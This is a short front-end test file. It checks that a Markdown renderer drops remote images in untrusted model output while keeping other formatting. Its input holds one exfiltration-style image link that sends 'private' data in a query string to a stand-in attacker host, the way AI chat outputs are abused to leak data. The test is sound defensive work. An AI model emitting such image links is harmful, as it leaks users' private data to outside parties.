import { render, screen } from "@testing-library/react";
import { expect, it } from "vitest";
import { Markdown } from "./markdown";

it("does not fetch remote Markdown images from untrusted model content", () => {
  const { container } = render(
    <Markdown>{"![private](https://attacker.invalid/?data=private)\n\n**Readable**"}</Markdown>,
  );
  expect(container.querySelector("img")).toBeNull();
  expect(screen.getByText("Readable").tagName).toBe("STRONG");
});
